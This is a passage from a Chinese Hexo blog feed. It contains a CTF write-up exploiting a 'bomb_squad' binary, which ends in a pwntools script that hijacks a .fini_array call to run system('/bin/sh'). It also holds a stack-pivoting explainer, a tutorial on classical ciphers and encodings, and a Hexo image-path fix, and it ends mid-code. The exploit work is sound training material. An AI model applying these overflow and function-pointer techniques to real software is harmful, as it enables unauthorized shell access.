v5++;</span><br><span class="line">    <span class="keyword">if</span> ( *v0 != keys[v3 - <span class="number">97</span>] )</span><br><span class="line">      explode_bomb();</span><br><span class="line">    lastentered = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  phase3_solved = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接收一串字符串，要求keys里面的字符串要与v5的对应。但实际上不需要这么麻烦，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>当输入为<code>\x00</code>时，就会跳出循环，直接返回。</p>
<h3 id="phase_4">phase_4</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">phase_4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  s = (<span class="keyword">char</span> *)get_line();</span><br><span class="line">  <span class="built_in">sscanf</span>(s, <span class="string">"%d %d %d %d %d %d %d"</span>, v5, &amp;v5[<span class="number">1</span>], &amp;v5[<span class="number">2</span>], &amp;v5[<span class="number">3</span>], &amp;v5[<span class="number">4</span>], &amp;v5[<span class="number">5</span>], &amp;v5[<span class="number">6</span>]);</span><br><span class="line">  v2 = &amp;n1;</span><br><span class="line">  result = n1.num;</span><br><span class="line">  v3 = n1.num;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[i] &lt; <span class="number">0</span> || v5[i] &gt; <span class="number">3</span> )</span><br><span class="line">      explode_bomb();</span><br><span class="line">    v2 = (node *)*((_DWORD *)&amp;v2-&gt;next1 + v5[i]);</span><br><span class="line">    result = v2-&gt;num;</span><br><span class="line">    v3 += result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="number">95</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  phase4_solved = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里n1是一个结构体，大致结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    node* next1;</span><br><span class="line">    node* next2;</span><br><span class="line">    node* next3;</span><br><span class="line">    node* next4;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这一关接收用户输入的数字，根据数字来进行结构体之间num相加的顺序。</p>
<p>比如输入为<code>"0 3"</code>，相加的顺序就是<code>0xa+0x7+0x10</code>。</p>
<p>最后试出来解为<code>3 0 3 0 3 0 0</code>。</p>
<h3 id="secret_phase">secret_phase</h3>
<p>通关之后会进入<code>print_flag</code>，经过<code>verify_working</code>之后会打印出来flag</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">print_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( verify_working() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulations, you won! Here's the flag:"</span>);</span><br><span class="line">    system(<span class="string">"cat flag.txt"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是<code>verify_working</code>始终返回1的，而且最终也并没有得到flag，还是需要getshell。</p>
<p>进入<code>secret_phase</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">secret_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"this is the secret phase.... please whisper, to keep it a seecret..."</span>);</span><br><span class="line">  v2 = &amp;n1;</span><br><span class="line">  v3 = n2;</span><br><span class="line">  v4 = &amp;n3;</span><br><span class="line">  v5 = &amp;n4;</span><br><span class="line">  v6 = &amp;n5;</span><br><span class="line">  v7 = &amp;n6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rename node #%d to: "</span>, i + <span class="number">1</span>);</span><br><span class="line">    fgets((*(&amp;v2 + i))-&gt;name, <span class="number">9</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    *(_BYTE *)strchrnul((*(&amp;v2 + i))-&gt;name, <span class="number">10</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Thanks, I was worried about having to come up with clever names myself!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段代码是修改每一个node的name成员，最多只可以溢出一个字节到num上面，并没有什么用。</p>
<h3 id="fini段">fini段</h3>
<blockquote>
<p>该section保存着进程终止代码指令。因此，当一个程序正常退出时，系统安排执行这个section的中的代码。</p>
</blockquote>
<p><code>.fini_array</code>中有一个<code>__gg</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v5 = &amp;n1;</span><br><span class="line">v6 = n2;</span><br><span class="line">v7 = &amp;n3;</span><br><span class="line">v8 = &amp;n4;</span><br><span class="line">v9 = &amp;n5;</span><br><span class="line">v10 = &amp;n6;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v0 = alloca(<span class="number">32</span>);</span><br><span class="line">  v1 = *(&amp;v5 + i);</span><br><span class="line">  v2 = (_DWORD *)(<span class="number">16</span> * (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v6 + <span class="number">3</span>) &gt;&gt; <span class="number">4</span>));</span><br><span class="line">  *v2 = *v1;</span><br><span class="line">  v2[<span class="number">1</span>] = v1[<span class="number">1</span>];</span><br><span class="line">  v2[<span class="number">2</span>] = v1[<span class="number">2</span>];</span><br><span class="line">  v2[<span class="number">3</span>] = v1[<span class="number">3</span>];</span><br><span class="line">  v2[<span class="number">4</span>] = v1[<span class="number">4</span>];</span><br><span class="line">  v2[<span class="number">5</span>] = v1[<span class="number">5</span>];</span><br><span class="line">  v2[<span class="number">6</span>] = v1[<span class="number">6</span>];</span><br><span class="line">  result = *(_DWORD *)(<span class="number">16</span> * (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v6 + <span class="number">3</span>) &gt;&gt; <span class="number">4</span>) + <span class="number">0x14</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    result = (*(<span class="keyword">int</span> (**)(<span class="keyword">void</span>))(<span class="number">16</span> * (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v6 + <span class="number">3</span>) &gt;&gt; <span class="number">4</span>) + <span class="number">0x14</span>))();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>经过分析之后发现这个函数会执行每个node中<code>name[4]-name[8]</code>所指向的函数，而name自然可以控制。并且call的时候，此时栈顶指向的就是当前node。那么只需要把某一个node的name后四个字节修改成system，next1指向的内容修改为<code>/bin/sh\x00</code>就可以getshell。</p>
<h3 id="任意地址写">任意地址写</h3>
<p>__nr函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> _nr()</span><br><span class="line">&#123;</span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v0 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_line();</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, v0);</span><br><span class="line">  v1 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_line();</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显的栈溢出，可以通过第一个输入，将v4覆盖为<code>node-&gt;next1</code>的地址，通过第二个输入在修改<code>next1</code>所指向的内容。</p>
<h3 id="payload">payload</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./bomb_squad"</span>)</span><br><span class="line">p.sendline(<span class="string">"8584"</span>)</span><br><span class="line">p.sendline(<span class="string">"[1, 1, 3, 5, 11, 21]"</span>)</span><br><span class="line">p.sendline(<span class="string">"\x00"</span>)</span><br><span class="line">p.sendline(<span class="string">"3 0 3 0 3 0 0"</span>)</span><br><span class="line">system = <span class="number">0x080485A0</span></span><br><span class="line">n3 = <span class="number">0x804b0a8</span></span><br><span class="line">nr = <span class="number">0x08048CDA</span></span><br><span class="line">payload = <span class="string">'aaaa'</span> + p32(nr) <span class="comment">#首先利用__gg函数执行node1中的__nr函数</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">'bbbb'</span> + p32(system) + <span class="string">"\n\n\n\n"</span> <span class="comment">#接着写入system地址到node2等待第二次call，最后4个\n跳过剩下4个node-&gt;name的修改</span></span><br><span class="line">p.send(payload) </span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xfc</span> + p32(n3) <span class="comment">#栈溢出，修改n3-&gt;next1指向的内容</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>之所以为什么是要修改<code>n3-&gt;next1</code>，因为system地址写入到了node2的name中，当<code>__gg</code>函数执行时，此时栈顶排列为</p>
<table>
<thead>
<tr class="header">
<th>n3</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>n4</td>
</tr>
<tr class="even">
<td>n5</td>
</tr>
<tr class="odd">
<td>n6</td>
</tr>
<tr class="even">
<td>name</td>
</tr>
<tr class="odd">
<td>num</td>
</tr>
</tbody>
</table>
<p>接下来就要执行system函数，所以要修改n3指向的地址。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>栈迁移的相关操作</title>
    <url>/2019/07/28/frame-faking/</url>
    <content><![CDATA[<h1 id="frame-faking">frame faking</h1>
<h2 id="原理">原理</h2>
<p>通过覆盖栈上的数据来控制EBP的值，进而控制ESP的值。</p>
<p>构造payload：</p>
<table>
<thead>
<tr class="header">
<th>buffer padding</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>fake EBP</td>
</tr>
<tr class="even">
<td>leave_retn</td>
</tr>
</tbody>
</table>
<p>其中leave retn就相当于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leave		;mov esp, ebp # 将ebp的值赋给esp</span><br><span class="line">		    ;pop ebp # 弹出ebp</span><br><span class="line">retn		;pop eip #弹出eip</span><br></pre></td></tr></table></figure>
<p>函数的返回地址被覆盖为leave retn，也就是说程序执行完自己的leave retn之后，还会再执行一次leave retn。其中fake EBP是新栈帧的地址。</p>
<p>流程如下：</p>
<ol type="1">
<li>在有栈溢出的程序执行 leave 时，其分为两个步骤
<ul>
<li>mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。</li>
<li>pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp 便指向了 ebp2，也就是保存了 ebp2 所在的地址。</li>
</ul></li>
<li>执行 ret 指令，会再次执行 leave ret 指令。</li>
<li>执行 leave 指令，其分为两个步骤
<ul>
<li>mov esp, ebp ，这会将 esp 指向 ebp2。</li>
<li>pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。</li>
</ul></li>
<li>执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行
<ul>
<li>push ebp，会将 ebp2 值压入栈中，</li>
<li>mov ebp, esp，将 ebp 指向当前基地址。</li>
</ul></li>
</ol>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中遇到过的编码和加密</title>
    <url>/2019/07/10/encrypt/</url>
    <content><![CDATA[<h2 id="栅栏密码">栅栏密码</h2>
<p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
<p>一般比较常见的是2栏的栅栏密码。</p>
<p>比如明文：THERE IS A CIPHER</p>
<p>去掉空格后变为：THEREISACIPHER</p>
<p>两个一组，得到：TH ER EI SA CI PH ER</p>
<p>先取出第一个字母：TEESCPE</p>
<p>再取出第二个字母：HRIAIHR</p>
<p>连在一起就是：TEESCPEHRIAIHR</p>
<p><a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="noopener">解密工具</a></p>
<h2 id="凯撒密码">凯撒密码</h2>
<p>密码学中，<strong>恺撒密码</strong>（英语：Caesar cipher），或称<strong>恺撒加密</strong>、<strong>恺撒变换</strong>、<strong>变换加密</strong>，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。</p>
<p>加密实例：</p>
<p>明文： <code>The quick brown fox jumps over the lazy dog</code></p>
<p>偏移量：1</p>
<p>密文： <code>Uif rvjdl cspxo gpy kvnqt pwfs uif mbaz eph</code></p>
<p><a href="https://planetcalc.com/1434/" target="_blank" rel="noopener">解密工具</a></p>
<h2 id="猪圈密码">猪圈密码</h2>
<p><strong>猪圈密码</strong>（亦称<strong>朱高密码</strong>、<strong>共济会暗号</strong>、<strong>共济会密码</strong>或<strong>共济会员密码</strong>），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。</p>
<p><img src="https://i.loli.net/2020/08/30/LNbSD9Fz7nu5Yp2.png" alt="猪圈密码" /></p>
<p><img src="https://i.loli.net/2020/08/30/MFi41uG8V3asBrK.png" alt="示例" /></p>
<h2 id="维吉尼亚密码">维吉尼亚密码</h2>
<p><strong>维吉尼亚密码</strong>（又译<strong>维热纳尔密码</strong>）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式</p>
<p><img src="https://i.loli.net/2020/08/30/HE9e8hPYCyjnklZ.png" alt="密码表" /></p>
<p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密钥(循环使用，密钥越长相对破解难度越大)： <code>CULTURE</code></p>
<p>加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母'T'列和密钥字母'C'行的交点就是密文字母'V'，以此类推。</p>
<p>密文： <code>VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK</code></p>
<h3 id="已知密钥">已知密钥</h3>
<p><a href="https://planetcalc.com/2468/" target="_blank" rel="noopener">解密工具</a></p>
<h3 id="未知密钥">未知密钥</h3>
<p>破解维吉尼亚密码第一步是确定密钥长度，维吉尼亚密码分析这篇文章里介绍了使用 <a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="noopener">重合指数</a> 算法来确定密钥长度，在确定密钥长度后就可以尝试确定密钥，通常我们可以使用 <a href="https://en.wikipedia.org/wiki/Chi-squared_test" target="_blank" rel="noopener">卡方检验</a> 来找到每个字母的偏移量，基于<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="noopener">维吉尼亚密码分析</a>一文中的算法实现的工具破解示例。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ngram_score <span class="keyword">import</span> ngram_score</span><br><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Vigenere</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">qgram = ngram_score(<span class="string">'quadgrams.txt'</span>)</span><br><span class="line">trigram = ngram_score(<span class="string">'trigrams.txt'</span>)</span><br><span class="line">ctext = <span class="string">'kiqpbkxspshwehospzqhoinlgapp'</span></span><br><span class="line">ctext = re.sub(<span class="string">r'[^A-Z]'</span>,<span class="string">''</span>,ctext.upper())</span><br><span class="line"></span><br><span class="line"><span class="comment"># keep a list of the N best things we have seen, discard anything else</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nbest</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,N=<span class="number">1000</span>)</span>:</span></span><br><span class="line">        self.store = []</span><br><span class="line">        self.N = N</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,item)</span>:</span></span><br><span class="line">        self.store.append(item)</span><br><span class="line">        self.store.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">        self.store = self.store[:self.N]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self,k)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.store[k]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(self.store)</span><br><span class="line"></span><br><span class="line"><span class="comment">#init</span></span><br><span class="line">N=<span class="number">100</span></span><br><span class="line"><span class="keyword">for</span> KLEN <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">20</span>):</span><br><span class="line">    rec = nbest(N)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> permutations(<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>,<span class="number">3</span>):</span><br><span class="line">        key = <span class="string">''</span>.join(i) + <span class="string">'A'</span>*(KLEN-len(i))</span><br><span class="line">        pt = Vigenere(key).decipher(ctext)</span><br><span class="line">        score = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(ctext),KLEN):</span><br><span class="line">            score += trigram.score(pt[j:j+<span class="number">3</span>])</span><br><span class="line">        rec.add((score,<span class="string">''</span>.join(i),pt[:<span class="number">30</span>]))</span><br><span class="line"></span><br><span class="line">    next_rec = nbest(N)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,KLEN<span class="number">-3</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(N):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>:</span><br><span class="line">                key = rec[k][<span class="number">1</span>] + c</span><br><span class="line">                fullkey = key + <span class="string">'A'</span>*(KLEN-len(key))</span><br><span class="line">                pt = Vigenere(fullkey).decipher(ctext)</span><br><span class="line">                score = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(ctext),KLEN):</span><br><span class="line">                    score += qgram.score(pt[j:j+len(key)])</span><br><span class="line">                next_rec.add((score,key,pt[:<span class="number">30</span>]))</span><br><span class="line">        rec = next_rec</span><br><span class="line">        next_rec = nbest(N)</span><br><span class="line">    bestkey = rec[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    pt = Vigenere(bestkey).decipher(ctext)</span><br><span class="line">    bestscore = qgram.score(pt)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">        pt = Vigenere(rec[i][<span class="number">1</span>]).decipher(ctext)</span><br><span class="line">        score = qgram.score(pt)</span><br><span class="line">        <span class="keyword">if</span> score &gt; bestscore:</span><br><span class="line">            bestkey = rec[i][<span class="number">1</span>]</span><br><span class="line">            bestscore = score       </span><br><span class="line">    <span class="keyword">print</span> bestscore,<span class="string">'Vigenere, klen'</span>,KLEN,<span class="string">':"'</span>+bestkey+<span class="string">'",'</span>,Vigenere(bestkey).decipher(ctext)</span><br></pre></td></tr></table></figure>
<h2 id="培根密码">培根密码</h2>
<p>加密时，<a href="https://baike.baidu.com/item/明文" target="_blank" rel="noopener">明文</a>中的每个字母都会转换成一组五个英文字母。其转换依靠下表：</p>
<table>
<thead>
<tr class="header">
<th>A/a</th>
<th>aaaaa</th>
<th>H/h</th>
<th>aabbb</th>
<th>O/o</th>
<th>abbba</th>
<th>V/v</th>
<th>babab</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>B/b</td>
<td>aaaab</td>
<td>I/i</td>
<td>abaaa</td>
<td>P/p</td>
<td>abbbb</td>
<td>W/w</td>
<td>babba</td>
</tr>
<tr class="even">
<td>C/c</td>
<td>aaaba</td>
<td>J/j</td>
<td>abaab</td>
<td>Q/q</td>
<td>baaaa</td>
<td>X/x</td>
<td>babbb</td>
</tr>
<tr class="odd">
<td>D/d</td>
<td>aaabb</td>
<td>K/k</td>
<td>ababa</td>
<td>R/r</td>
<td>baaab</td>
<td>Y/y</td>
<td>bbaaa</td>
</tr>
<tr class="even">
<td>E/e</td>
<td>aabaa</td>
<td>L/l</td>
<td>ababb</td>
<td>S/s</td>
<td>baaba</td>
<td>Z/z</td>
<td>bbaab</td>
</tr>
<tr class="odd">
<td>F/f</td>
<td>aabab</td>
<td>M/m</td>
<td>abbaa</td>
<td>T/t</td>
<td>baabb</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>G/g</td>
<td>aabba</td>
<td>N/n</td>
<td>abbab</td>
<td>U/u</td>
<td>babaa</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>加密者需使用两种不同字体，分别代表A和B。准备好一篇包含相同AB字数的假信息后，按照密文格式化假信息，即依密文中每个字母是A还是B分别套用两种字体。</p>
<p>解密时，将上述方法倒转。所有字体一转回A，字体二转回B，以后再按上表拼回字母。</p>
<p>法兰西斯·培根另外准备了一种方法，其将大小写分别看作A与B，可用于无法使用不同字体的场合（例如只能处理纯文本时）。但这样比起字体不同更容易被看出来，而且和语言对大小写的要求也不太兼容。</p>
<p>培根密码本质上是将二进制信息通过样式的区别，加在了正常书写之上。培根密码所包含的信息可以和用于承载其的文章完全无关。</p>
<p>明文： <code>T H E F O X</code></p>
<p>密文： <code>baaba aabbb aabaa aabab abbab babab</code></p>
<p><a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">解密工具</a></p>
<h2 id="jjencodeaaencode">jjencode/aaencode</h2>
<p>jjencode代码，就是将正常的js代码转换成复杂的只有符号的字符串编码，</p>
<p>进行加密 如：<code>[$._$_]+$._$+",\\"+$.$__+$.___+"\\"+$.__$+$.__$+$</code>这样的组合。</p>
<p>aaencode代码，则是将正常的js代码转为好玩的特殊网络表情符号。</p>
<p>如:<code>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ)</code> 这样的表情文字.</p>
<p>解密方式：直接在浏览器F12开发人员工具中的控制台中输入密文执行即可</p>
<h2 id="jsfuck">JSfuck</h2>
<p>encode JavaScript with only 6 letters - <a href=""></a>!+</p>
<p><a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">解密工具</a></p>
<h2 id="brainfuckook">brainfuck/ook</h2>
<p>Brainfuck是一种极小化的计算机语言，按照"Turing complete（完整图灵机）"思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号( <code>&gt; &lt; + - . , [ ]</code> )的组合来完成。</p>
<p>Ook! 与Brainfuck类似, 但用单词“Ook！”，“Ook.” 和“Ook?”代替。</p>
<p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">解密工具</a></p>
<p>参考：<a href="https://www.tuicool.com/articles/2E3INnm" target="_blank" rel="noopener">CTF中那些脑洞大开的编码和加密</a></p>
]]></content>
      <tags>
        <tag>encrypt</tag>
      </tags>
  </entry>
  <entry>
    <title>使用hexo-asset-image图片路径错误</title>
    <url>/2019/07/01/hexo-image/</url>
    <content><![CDATA[<h1 id="part-1">Part 1</h1>
<p>今天提交文章的时候，上去博客看了一眼，发现图片全都显示不出来，</p>
<p>看了下图片url，全都是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;image&#x2F;123.jpg</span><br></pre></td></tr></table></figure>
<p>这种形式的。</p>
<p>因为我使用的typora来写markdown，自动插入图片默认的是本地路径，去设置里更改为使用相对路径即可</p>
<h1 id="part-2">part 2</h1>
<p>原本以为大功告成，结果发现还是显示错误，去网上查了下，有些插件没有装，_config.yml里的选项也没有开。。。</p>
<p>安装<code>hexo-asset-image</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>
<p>_config.yml配置</p>
<p><code>post_asset_folder: false</code>改为<code>post_asset_folder: true</code></p>
<h1 id="part-3">part 3</h1>
<p>再次以为大功告成，结果发现还是错误，之前<code>hexo g -d</code> 的时候没有注意，这次执行的时候突然发现有几条记录有点奇怪</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">update link as:--&gt;/.io//06/01/vim/1561905818946.png</span><br><span class="line">update link as:--&gt;/.io//06/01/vim/1561905818946.png</span><br></pre></td></tr></table></figure>
<p>这个<code>.io</code>不知道是怎么来的，不管怎么修改图片的路径，这个<code>.io</code>总是有</p>
<p>最终查来查去发现是<code>hexo-asset-image</code>这个插件的问题，hexo 3.0以上与hexo 3.0以下获取url的方式不同，结果就导致获取到了<code>.io</code>这种奇怪的域名。</p>
<h1 id="解决问题">解决问题</h1>
<p>参考<a href="https://blog.csdn.net/xjm850552586/article/details/84101345" target="_blank" rel="noopener">hexo引用本地图片无法显示</a></p>
<p>将<code>/node_modules/hexo-asset-image/index.js</code>里面的内容修改为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">'cheerio'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPosition</span>(<span class="params">str, m, i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> version = <span class="built_in">String</span>(hexo.version).split(<span class="string">'.'</span>);</span><br><span class="line">hexo.extend.filter.register(<span class="string">'after_post_render'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = hexo.config;</span><br><span class="line">  <span class="keyword">if</span>(config.post_asset_folder)&#123;</span><br><span class="line">    <span class="keyword">var</span> link = data.permalink;</span><br><span class="line">	<span class="keyword">if</span>(version.length &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">Number</span>(version[<span class="number">0</span>]) == <span class="number">3</span>)</span><br><span class="line">	   <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">'/'</span>, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	   <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">'/'</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">	<span class="comment">// In hexo 3.1.1, the permalink of "about" page is like ".../about/index.html".</span></span><br><span class="line">	<span class="keyword">var</span> endPos = link.lastIndexOf(<span class="string">'/'</span>) + <span class="number">1</span>;</span><br><span class="line">    link = link.substring(beginPos, endPos);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toprocess = [<span class="string">'excerpt'</span>, <span class="string">'more'</span>, <span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; toprocess.length; i++)&#123;</span><br><span class="line">      <span class="keyword">var</span> key = toprocess[i];</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">var</span> $ = cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: <span class="literal">false</span>,</span><br><span class="line">        xmlMode: <span class="literal">false</span>,</span><br><span class="line">        lowerCaseTags: <span class="literal">false</span>,</span><br><span class="line">        decodeEntities: <span class="literal">false</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(<span class="string">'img'</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ($(<span class="keyword">this</span>).attr(<span class="string">'src'</span>))&#123;</span><br><span class="line">			<span class="comment">// For windows style path, we replace '\' to '/'.</span></span><br><span class="line">			<span class="keyword">var</span> src = $(<span class="keyword">this</span>).attr(<span class="string">'src'</span>).replace(<span class="string">'\\'</span>, <span class="string">'/'</span>);</span><br><span class="line">			<span class="keyword">if</span>(!<span 